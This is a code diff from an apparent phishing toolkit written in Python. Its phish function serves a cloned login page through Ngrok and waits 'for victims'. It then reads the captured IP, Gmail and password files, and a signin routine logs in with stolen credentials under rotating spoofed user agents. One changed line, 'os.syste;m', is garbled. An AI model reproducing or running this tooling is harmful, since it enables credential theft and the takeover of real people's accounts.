@@ -252,23 +252,36 @@ def phish(template):
 	{C} Server   : {G} Ngrok
         {C} Port     : {G} {port}
 	
-	{B} STARTING SERVERS
-{G}{"="*25}{Y}LOGS{G}{"="*25}{R} """)
+	{B}.         STARTING SERVERS
+{G}{"="*25}{Y}  LOGS  {G}{"="*25}{R}""")
 	link = startServicea(template+"/",port)
-	print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}\n ')
-	print(f"{G} LINK = {Y} {link}")
+	print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
+	print(f"\n{G} LINK = {Y} {link}")
 	print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
 	print()
 	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
-	def check_ok():
-		os.system('rm ip.txt gmail.txt pass.txt > /dev/null 2&>1 ')
-		try:
-			os.system(" touch ip.txt && tail -f ip.txt	")
-		except KeyboardInterrupt:
-			print(f"\n\n{Y} Exiting ")
-			os.system('pkill ngrok ')
-			exit(0)			
-	check_ok()
+	def check(file):
+		if os.path.exists(file):
+			return True
+		else:
+			return False
+	def ok():
+		while True:
+			a = check("ip.txt")
+			if a==True:
+				os.syste;m('cat ip.txt')
+				os.remove('ip.txt')
+				continue
+			else:
+				continue		
+	try:
+		ok()
+
+	except Exception:
+		os.system("pkill ngrok php")
+		print("\n{R} Exiting ")
+		
+
 	exit()
 
 def startServicea(folder,port):
@@ -401,18 +414,17 @@ def signin(password,username):
          usa2 = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36'
          usa3 = 'Mozilla/5.0 (Linux; Android 9; SM-J701F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 GSA/12.22.8.23.arm'
          us4 = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36'
-         us5 = 'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
-         us6 = 'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
-         us7 = 'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
-         us8 = 'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+
          us9 = 'Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
          us10 = 'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
          us11 = 'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
          us12  = 'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us15 = 'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)'
+         us16 = 'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36'
          us13 = 'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/94.0'
          us14 = 'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:94.0) Gecko/94.0 Firefox/94.0'
-         user = ua.random
-         usa = (usa1,usa2,usa3,us4,us5,us6,us7,us8,us9,us10,us11,us12,us14)
+         user = ua.firefox
+         usa = (usa1,usa2,usa3,us4,us9,us10,us11,us12,us14,us15,us16)
          usa = random.choice(list(usa))
          s = rs.Session()
 		  
